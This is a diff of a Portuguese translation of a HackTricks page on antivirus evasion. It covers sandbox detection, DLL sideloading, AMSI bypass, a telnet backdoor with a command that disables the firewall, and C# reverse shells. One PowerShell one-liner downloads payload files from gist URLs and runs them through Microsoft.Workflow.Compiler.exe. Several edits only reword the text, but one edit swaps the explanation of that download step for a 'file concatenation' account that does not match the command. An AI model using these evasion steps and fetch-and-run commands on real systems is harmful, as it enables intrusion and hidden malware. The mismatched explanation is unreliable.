@@ -5,7 +5,7 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
@@ -20,7 +20,7 @@ Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é mali
 
 ### **Detecção estática**
 
-A detecção estática é alcançada marcando strings ou matrizes de bytes maliciosas conhecidas em um binário ou script e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que o uso de ferramentas públicas conhecidas pode ser detectado com mais facilidade, pois provavelmente foram analisadas e marcadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:
+A detecção estática é alcançada marcando strings ou matrizes de bytes maliciosas conhecidas em um binário ou script e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que o uso de ferramentas públicas conhecidas pode ser facilmente detectado, pois provavelmente já foram analisadas e marcadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:
 
 * **Criptografia**
 
@@ -35,10 +35,10 @@ Se você criptografar o binário, não haverá como o AV detectar seu programa, 
 Se você desenvolver suas próprias ferramentas, não haverá assinaturas ruins conhecidas, mas isso leva muito tempo e esforço.
 
 {% hint style="info" %}
-Uma boa maneira de verificar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Basicamente, ele divide o arquivo em vários segmentos e, em seguida, solicita que o Defender verifique cada um individualmente, dessa forma, ele pode informar exatamente quais são as strings ou bytes marcados em seu binário.
+Uma boa maneira de verificar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Basicamente, ele divide o arquivo em vários segmentos e, em seguida, solicita ao Defender que verifique cada um individualmente, dessa forma, ele pode informar exatamente quais são as strings ou bytes marcados em seu binário.
 {% endhint %}
 
-Eu recomendo muito que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre Evasão de AV prática.
+Recomendo muito que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre Evasão de AV prática.
 
 ### **Análise dinâmica**
 
@@ -46,7 +46,7 @@ A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e ob
 
 * **Atraso antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, portanto, o uso de longos atrasos pode perturbar a análise de binários. O problema é que muitas sandboxes AV podem simplesmente ignorar o atraso, dependendo de como ele é implementado.
 * **Verificação dos recursos da máquina** Geralmente, as sandboxes têm muito poucos recursos para trabalhar (por exemplo, <2 GB de RAM), caso contrário, elas podem desacelerar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado na sandbox.
-* **Verificações específicas da máquina** Se você deseja segmentar um usuário cuja estação de trabalho está associada ao domínio "contoso.local", pode verificar o domínio do computador para ver se ele corresponde ao que você especificou, se não corresponder, você pode fazer seu programa sair.
+* **Verificações específicas da máquina** Se você deseja segmentar um usuário cuja estação de trabalho está associada ao domínio "contoso.local", pode verificar o domínio do computador para ver se ele corresponde ao que você especificou. Se não corresponder, você pode fazer seu programa sair.
 
 Acontece que o nome do computador da Sandbox do Microsoft Defender é HAL9TH, então você pode verificar o nome do computador em seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro da sandbox do Defender, então você pode fazer seu programa sair.
 
@@ -58,9 +58,9 @@ Algumas outras dicas muito boas de [@mgeeky](https://twitter.com/mariuszbit) par
 
 Como dissemos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então, você deve se perguntar algo:
 
-Por exemplo, se você deseja despejar o LSASS, **você realmente precisa usar o mimikatz**? Ou você poderia usar um projeto diferente que é menos conhecido e também despeja o LSASS.
+Por exemplo, se você deseja despejar LSASS, **você realmente precisa usar o mimikatz**? Ou você poderia usar um projeto diferente que é menos conhecido e também despeja LSASS.
 
-A resposta certa provavelmente é a última. Tomando o mimikatz como exemplo, é provavelmente um dos, senão o malware mais marcado pelos AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então basta procurar alternativas para o que você está tentando alcançar.
+A resposta certa provavelmente é a última. Tomando o mimikatz como exemplo, provavelmente é um dos, senão o malware mais marcado pelos AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então basta procurar alternativas para o que você está tentando alcançar.
 
 {% hint style="info" %}
 Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no defender e, por favor, seriamente, **NÃO FAÇA UPLOAD PARA O VIRUSTOTAL** se seu objetivo é alcançar a evasão a longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste-o lá até ficar satisfeito com o resultado.
@@ -68,7 +68,7 @@ Ao modificar seus payloads para evasão, certifique-se de **desativar o envio au
 
 ## EXEs vs DLLs
 
-Sempre que possível, **
+Sempre que possível, **priorize o uso
 ```powershell
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
     $binarytoCheck = "C:\Program Files\" + $_
@@ -79,9 +79,9 @@ Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForE
 
 Este comando irá listar os programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.
 
-Eu recomendo fortemente que você **explore os programas DLL Hijackable/Sideloadable por si mesmo**, essa técnica é bastante furtiva se feita corretamente, mas se você usar programas DLL Sideloadable publicamente conhecidos, pode ser facilmente descoberto.
+Eu recomendo fortemente que você **explore os programas DLL Hijackable/Sideloadable por si mesmo**, essa técnica é bastante furtiva se feita corretamente, mas se você usar programas DLL Sideloadable conhecidos publicamente, pode ser facilmente descoberto.
 
-Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não carregará sua carga útil, pois o programa espera algumas funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.
+Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar, não carregará sua carga útil, pois o programa espera algumas funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.
 
 **DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e sendo capaz de lidar com a execução da sua carga útil.
 
@@ -117,7 +117,7 @@ Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) qu
 <figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-Eu **recomendo fortemente** que você assista ao VOD do twitch [S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também o vídeo do [ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender mais sobre o que discutimos com mais profundidade.
+Eu **recomendo fortemente** que você assista ao VOD do twitch de [S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também o vídeo de [ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender mais sobre o que discutimos de forma mais aprofundada.
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
@@ -165,7 +165,7 @@ Existem algumas maneiras de contornar o AMSI:
 
 Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.
 
-No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenha várias camadas, então a ofuscação pode ser uma má opção dependendo de como é feita. Isso torna não tão direto para evitar. Embora, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e você estará bem, então depende de quanto algo foi sinalizado.
+No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenha várias camadas, então a ofuscação pode ser uma opção ruim dependendo de como é feita. Isso torna não tão direto para evitar. Embora, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e você estará bem, então depende de quanto algo foi sinalizado.
 
 * **Bypass AMSI**
 
@@ -215,7 +215,7 @@ Existem várias ferramentas que podem ser usadas para **ofuscar código C# em te
 * [**obfy**](https://github.com/fritzone/obfy): Adicione uma camada de operações ofuscadas geradas pelo framework de metaprogramação de modelos C++ que tornará a vida da pessoa que deseja quebrar a aplicação um pouco mais difícil.
 * [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar vários arquivos pe diferentes, incluindo: .exe, .dll, .sys
 * [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
-* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas pelo LLVM usando ROP (programação orientada a retorno). ROPfuscator ofusca um programa no nível de código de montagem, transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
+* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas pelo LLVM usando ROP (programação orientada a retorno). O ROPfuscator ofusca um programa no nível de código de montagem, transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
 * [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um criptografador .NET PE escrito em Nim
 * [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e depois carregá-los
 
@@ -239,7 +239,7 @@ O SmartScreen funciona principalmente com uma abordagem baseada em reputação, 
 
 Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de contêiner como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **não NTFS**.
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
 
 [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evitar o Mark-of-the-Web.
 
@@ -331,7 +331,7 @@ sc config TlntSVR start= auto obj= localsystem
 ```
 **Alterar a porta do telnet** (stealth) e desativar o firewall:
 
-Para evitar a detecção de um ataque, é possível alterar a porta padrão do serviço Telnet para uma porta diferente. Isso dificulta a detecção do serviço pelos administradores de rede e pelos sistemas de detecção de intrusão. Além disso, desativar o firewall pode permitir que o atacante tenha acesso mais fácil ao sistema alvo.
+Para evitar a detecção de um ataque, é possível alterar a porta padrão do telnet para uma porta diferente. Isso dificulta a detecção do ataque por meio de ferramentas de monitoramento de rede. Além disso, desativar o firewall pode permitir que o ataque seja executado sem ser bloqueado pelo firewall.
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
@@ -388,9 +388,9 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### Primeiro shell reverso em C#
+#### Primeiro Revershell em C#
 
-Compile-o com:
+Compile com:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
@@ -472,13 +472,17 @@ namespace ConnectBack
 ```
 ### C# usando compilador
 
-Este método envolve o uso do compilador C# para compilar um código malicioso em um arquivo executável. O arquivo executável pode ser executado em um sistema Windows sem a necessidade de instalar o .NET Framework. O código malicioso é um shell reverso simples que se conecta a um servidor remoto controlado pelo invasor. O compilador C# é usado para compilar o código malicioso em um arquivo executável que pode ser executado em um sistema Windows. O arquivo executável é então enviado para a vítima e executado em seu sistema. O shell reverso é estabelecido e o invasor pode controlar o sistema remotamente.
+Este método envolve o uso do compilador C# para compilar um código malicioso em um arquivo executável. O arquivo executável pode ser executado em um sistema Windows sem a necessidade de instalar o .NET Framework. O código malicioso é um shell reverso simples que se conecta a um servidor remoto e permite que um invasor execute comandos no sistema comprometido. O código-fonte completo pode ser encontrado no seguinte link: [https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
 Download e execução automática:
 
-O objetivo dessa técnica é fazer o download e execução automática de um arquivo malicioso sem que o usuário perceba. Para isso, é utilizado um arquivo REV.txt que contém um script PowerShell que faz o download do arquivo malicioso REV.shell e o executa. O script é executado através do comando "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NoLogo -Command" que permite a execução do script sem que o usuário perceba. É importante ressaltar que essa técnica pode ser detectada por antivírus que possuem proteção contra download e execução automática de arquivos.
+O objetivo dessa técnica é fazer com que o usuário execute um arquivo malicioso sem perceber. Para isso, o atacante pode usar um arquivo legítimo como isca e injetar o código malicioso nele. Quando o usuário executa o arquivo, o código malicioso é executado junto com o código legítimo.
+
+O arquivo REV.txt contém o código malicioso que será injetado no arquivo legítimo. Já o arquivo REV.shell é o arquivo legítimo que será usado como isca. O código malicioso é injetado no arquivo legítimo usando a técnica de "concatenação de arquivos". 
+
+Para automatizar o download e a execução do arquivo malicioso, o atacante pode usar técnicas como phishing, engenharia social ou exploração de vulnerabilidades em softwares desatualizados.
 ```csharp
 64bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
@@ -544,7 +548,7 @@ https://github.com/praetorian-code/vulcan
 * Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
